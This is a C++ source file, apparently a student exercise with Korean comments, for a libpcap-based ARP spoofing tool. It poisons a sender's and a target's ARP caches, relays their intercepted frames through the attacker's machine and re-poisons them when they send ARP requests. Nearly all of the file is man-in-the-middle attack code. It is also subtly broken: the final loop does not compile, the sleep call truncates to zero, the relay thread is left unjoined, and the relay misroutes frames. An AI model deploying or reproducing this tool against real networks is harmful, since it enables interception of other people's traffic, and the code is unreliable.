#include <main.h>
#include <util.h>
#include <arp.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <thread>

static MacManager localMacAddress;
static IpManager localIpAddress;

// Print Usage
void usage() {
	printf("Usage: arp_spoof <interface> <sender ip> <target ip>\n");
	printf("sample: arp_spoof wlan0 192.168.0.1 192.168.0.2\n");
}

void getMacAddress(IN pcap_t* handle, OUT ArpSession* arpSession) {
	// Get Sender MAC Address
	printf("[*] 1. Get Sender MAC Address\n");
	getSenderMacAddress(handle, localMacAddress, localIpAddress, arpSession->senderIpAddress, arpSession->senderMacAddress);
	arpSession->senderMacAddress.printMacAddress("[+] Sender MAC Address : ");
	printf("\n");

	// Get Target MAC Address
	printf("[*] 2. Get Target MAC Address\n");
	getSenderMacAddress(handle, localMacAddress, localIpAddress, arpSession->targetIpAddress, arpSession->targetMacAddress);
	arpSession->targetMacAddress.printMacAddress("[+] Target MAC Address : ");
	printf("\n");
}

void relayPacket(IN pcap_t* handle, IN std::vector<ArpSession> arpSessions) {
	int idx;

	// 내가 수신한 패킷 중 
	//     Source MAC Address가 sender(게이트웨이) 또는 target의 MAC 주소이고,
	//     Destination IP Address가 sender(게이트웨이) 또는 target의 IP주소라면:
	while (true) {
		struct pcap_pkthdr* pcapHeader;
		const u_char* packet;
		if (pcap_next_ex(handle, &pcapHeader, &packet) < 0) {
			fprintf(stderr, "[-] Failed to receive packet\n");
			break;
		}

		EthernetHeader* ethernetPacket = (EthernetHeader *)packet;

		// relay packet
		for (auto arpSessionIterator = arpSessions.begin(); arpSessionIterator != arpSessions.end(); arpSessionIterator++) {
			if ((ethernetPacket->sourceMacAddress == arpSessionIterator->targetMacAddress
			||	ethernetPacket->sourceMacAddress == arpSessionIterator->senderMacAddress) 
			&&  ethernetPacket->destinationMacAddress == localMacAddress) {
					printf("[*] Relay Packet\n");
					ethernetPacket->destinationMacAddress = arpSessionIterator->targetMacAddress;
					ethernetPacket->sourceMacAddress = localMacAddress;
					if (pcap_sendpacket(handle, packet, pcapHeader->caplen)) {
						fprintf(stderr, "[-] Failed to send relay packet\n");
						break;
					}
			} else if(ntohs(ethernetPacket->type) == ETHERNET_TYPE_ARP) {
                ArpHeader* arpPacket = (ArpHeader *)(packet + sizeof(EthernetHeader));

                // print packet info
                printArpPacketInfo(*arpPacket);

                // ARP Request (Sender -> Broadcast)
                if(ethernetPacket->sourceMacAddress == arpSessionIterator->senderMacAddress
                && ethernetPacket->destinationMacAddress.isBroadcast()
                && ntohs(arpPacket->operationCode) == ARP_OPERATION_REQUEST) {
                    printf("[!] Reinfect Sender\n");
                    sleep(0.1); // wait real ARP reply
                    infectSender(handle, localMacAddress, *arpSessionIterator); // send infect arp packet
                } else 
                // ARP Request (Target -> Broadcast)
                if(ethernetPacket->sourceMacAddress == arpSessionIterator->targetMacAddress
                && ethernetPacket->destinationMacAddress.isBroadcast()
                && ntohs(arpPacket->operationCode) == ARP_OPERATION_REQUEST) {
                    printf("[!] Reinfect Sender\n");
                    sleep(0.1); // wait real ARP reply
                    infectSender(handle, localMacAddress, *arpSessionIterator); // send infect arp packet
                }
            }
		}
	}
}

int main(int argc, char* argv[]) {
	pcap_t* handle = NULL;
	std::vector<ArpSession> arpSessions;
	std::vector<std::thread> threads;
	std::thread relayThread;
	struct in_addr laddr;

	int idx;
	char errbuf[PCAP_ERRBUF_SIZE];

	if (argc != 4 || argc % 2) {
		usage();
		return EXIT_FAILURE;
	}

	// allocate memory
	arpSessions.reserve(argc - 2);
	threads.reserve(argc - 2);

	handle = pcap_open_live(argv[1], BUFSIZ, PROMISCUOUS, 1024, errbuf);
	if (handle == NULL) {
		perror("pcap_open_live");
		return EXIT_FAILURE;
	}

	// initialize local MAC address
	if (getLocalMacAddress(argv[1], localMacAddress) == EXIT_FAILURE) {
		fprintf(stderr, "[-] Invalid Attacker MAC Address !\n");
		return EXIT_FAILURE;
	}

	// initialize local IP address
	if (getLocalIpAddress(argv[1], localIpAddress) == EXIT_FAILURE) {
		fprintf(stderr, "[-] Failed to get IP Address !\n");
		return EXIT_FAILURE;
	}

	// initialize ARP Session Vector
	for (idx = 2; idx < argc; idx += 2) {
		ArpSession currentSession;

		if (inet_aton(argv[idx], &laddr) < 0) {
			fprintf(stderr, "[-] IP Address Format Invalid !\n");
			return EXIT_FAILURE;
		}
		currentSession.senderIpAddress = laddr;
		if (inet_aton(argv[idx + 1], &laddr) < 0) {
			fprintf(stderr, "[-] IP Address Format Invalid !\n");
			return EXIT_FAILURE;
		}
		currentSession.targetIpAddress = laddr;

		arpSessions.push_back(currentSession);
	}

	// initialize Get Mac Address Thread
	for (auto sessionIterator = arpSessions.begin(); sessionIterator != arpSessions.end(); sessionIterator++) {
		threads.push_back(std::thread(getMacAddress, handle, &(*sessionIterator))); 
	}

	// wait to find MAC Address
	for (auto threadIterator = threads.begin(); threadIterator != threads.end(); threadIterator++) {
		(*threadIterator).join();
	}
	threads.clear();

	// start relay thread
	relayThread = std::thread(relayPacket, handle, arpSessions);

	// Spoofing MAC Address
	printf("[*] 3. ARP Spoofing\n");
	for (auto sessionIterator = arpSessions.begin(); sessionIterator.end(); sessionIterator++) {
		infectSender(handle, localMacAddress, *sessionIterator);
	}

	if (handle) pcap_close(handle);

	return EXIT_SUCCESS;
}
